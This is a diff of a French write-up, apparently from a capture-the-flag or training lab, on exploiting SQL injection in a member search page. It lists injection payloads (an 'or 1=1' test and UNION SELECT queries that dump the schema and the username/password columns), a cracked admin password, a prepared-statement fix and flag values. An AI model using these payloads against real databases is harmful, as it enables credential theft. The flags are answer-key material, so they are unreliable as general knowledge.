@@ -9,7 +9,8 @@
 </head>
 
 <body class="stackedit">
-  <div class="stackedit__html"><p>sql_injection(users)</p>
+  <div class="stackedit__html"><p>sql_injection_user.html</p>
+<p>sql_injection(users)</p>
 <h1 id="sql-injection-user">Sql injection (user)</h1>
 <p>L’injection SQL permet a un attaquant d’executer des requêtes SQL sur ls base de donnée.</p>
 <h1 id="reproduction">Reproduction</h1>
@@ -17,6 +18,7 @@
 <ol>
 <li>On se rend sur la page member (qui nous permet normalement de chercher un utilisateur)</li>
 <li>Nous confirmons que le site est vulnérable en tapant <code>6 or 1=1</code> comme input</li>
+<li>Premiere requête pour avoir une vue d’ensemble de la structure de la BDD : <code>1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables</code></li>
 <li>Après quelques recherches, <code>1 or 1=2 UNION ALL SELECT concat(table_name),concat(column_name) FROM information_schema.COLUMNS--</code> nous permet de visualiser complètement la base de données</li>
 <li>En observant la structure de la BDD, on en déduit que <code>1 or 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default--</code> va nous permettre d’avoir des infos intéressantes</li>
 <li>On obtient en effet le hash de root et admin. On décode ce hash et on obtient <strong>shadow</strong> .</li>
@@ -42,6 +44,7 @@
 <li>Utiliser des requêtes préparées (permet d’indiquer a la bdd a structure de la requête avant de lui envoyer les données sous forme de paramètres</li>
 </ul>
 <pre><code>flag1 = B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
+
 
 </code></pre>
 <p><code>flag2 = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5</code></p>
